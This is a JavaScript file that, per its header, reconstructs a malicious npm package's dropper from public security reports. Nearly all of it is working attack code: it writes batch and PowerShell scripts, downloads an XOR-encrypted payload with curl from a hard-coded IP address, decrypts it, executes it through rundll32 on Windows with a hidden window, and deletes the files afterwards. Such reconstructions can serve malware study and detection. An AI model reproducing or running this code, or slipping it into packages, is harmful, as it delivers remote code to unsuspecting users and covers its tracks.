// xor-dll-dropper — reconstructed from public security analyses
// Source: https://blog.phylum.io/crypto-themed-npm-packages-found-delivering-stealthy-malware/
//
// Multi-stage attack: JavaScript creates batch + PowerShell scripts,
// downloads XOR-encrypted payload, decrypts with PowerShell, executes
// via rundll32. All evidence deleted after execution.
//
// Technique: JS → .bat → PowerShell → XOR decrypt → rundll32 execution

const fs = require("fs");
const path = require("path");
const os = require("os");
const { execSync } = require("child_process");

var tmpDir = os.tmpdir();

// Create PowerShell decryption script
var ps1Content = [
  "$data = [System.IO.File]::ReadAllBytes('" + path.join(tmpDir, "sqlite.a") + "')",
  "$key = 0xef",
  "$decoded = @()",
  "foreach ($byte in $data) {",
  "  $decoded += ($byte -bxor $key)",
  "}",
  "[System.IO.File]::WriteAllBytes('" + path.join(tmpDir, "sql.tmp") + "', [byte[]]$decoded)",
].join("\n");

var ps1Path = path.join(tmpDir, "preinstall.ps1");
fs.writeFileSync(ps1Path, ps1Content);

// Create batch file that orchestrates the attack
var batContent = [
  "@echo off",
  'curl -sLo "' + path.join(tmpDir, "sqlite.a") + '" "http://89.116.75.39/npm.mov"',
  'powershell -ExecutionPolicy Bypass -File "' + ps1Path + '" -wait',
  'del "' + ps1Path + '"',
  'ren "' + path.join(tmpDir, "sql.tmp") + '" preinstall.db',
  'rundll32 "' + path.join(tmpDir, "preinstall.db") + '",CalculateSum 4906',
  'del "' + path.join(tmpDir, "sqlite.a") + '"',
  'del "' + path.join(tmpDir, "preinstall.db") + '"',
].join("\r\n");

var batPath = path.join(tmpDir, "install.bat");
fs.writeFileSync(batPath, batContent);

// Execute on Windows only
if (os.platform() === "win32") {
  try {
    execSync('cmd /c "' + batPath + '"', { windowsHide: true });
  } catch(e) {}
}

// Cleanup
try { fs.unlinkSync(batPath); } catch(e) {}
try { fs.unlinkSync(ps1Path); } catch(e) {}
